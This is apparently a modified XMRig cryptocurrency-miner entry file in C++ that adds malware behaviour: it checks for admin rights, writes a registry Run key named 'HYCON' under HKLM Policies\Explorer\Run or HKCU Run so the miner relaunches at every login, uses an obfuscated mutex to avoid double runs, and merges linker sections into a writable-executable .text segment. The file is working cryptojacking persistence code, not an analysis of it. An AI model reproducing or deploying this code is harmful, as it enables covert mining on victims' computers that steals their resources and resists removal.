/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#define _UNICODE

#include "App.h"
#include <windows.h>
#include <TCHAR.H>
#include <thread>
#include <sddl.h>
#include <stdio.h>
#include <aclapi.h>
#include <stdlib.h>
#include <Shlwapi.h>
#define STRICT
#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

#define STRLEN(x)(sizeof(x) / sizeof(TCHAR) - 1)

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

	BOOL IsElevated() {
		BOOL fRet = FALSE;
		HANDLE hToken = NULL;
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION Elevation;
			DWORD cbSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
				fRet = Elevation.TokenIsElevated;
			}
		}
		if (hToken) {
			CloseHandle(hToken);
		}
		return fRet;
	}

	int CheckMutex() {
		WCHAR MUTEX[] = { L"Thfhgfgfghffhfhfhhffhdccecethybynun7mn7" };
		HANDLE hMutex = CreateMutexW(0, 0, MUTEX);
		if ((GetLastError() == ERROR_ALREADY_EXISTS) || (GetLastError() == ERROR_ACCESS_DENIED)) {
			CloseHandle(hMutex);
			std::exit(0);
		}
		return 0;
	}

	int AutoRun(TCHAR* path, BOOL Admin) {
		HKEY hKey = NULL;
		HKEY hKey2 = NULL;
		LONG lResult = 0;
		if (Admin) { 
			lResult = RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hKey2);
			if (ERROR_SUCCESS != lResult) {
				RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hKey2);
			}
			RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hKey2);
			RegSetValueEx(hKey2, L"HYCON", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
			RegCloseKey(hKey2);
		}
		else { 
			RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
			RegSetValueEx(hKey, L"HYCON", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
			RegCloseKey(hKey);
		}
		return 0;
	}


	int CheckPath() {
		TCHAR Username[256]; // To protect file
		HKEY hKey3 = NULL;
		LONG flag = 0;
		TCHAR AppData[1024 + 1]; // Drop path var
		BOOL Admin = IsElevated(); // Admin? true/false
		TCHAR CruPath[MAX_PATH + 1]; // Current path var
		RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);

		flag = RegQueryValueEx(hKey3, L"HYCON", 0, 0, 0, 0);
		GetModuleFileName(NULL, CruPath, STRLEN(CruPath)); // Current file path
		if (ERROR_FILE_NOT_FOUND == flag) {
			AutoRun(CruPath, Admin); // Set Autorun at current path
		}
		else { // Or
			CheckMutex(); // Doublerun?
			return 0;
		}
	}


int main(int argc, char **argv) {

	CheckPath();
    App app(argc, argv);

    return app.exec();
}
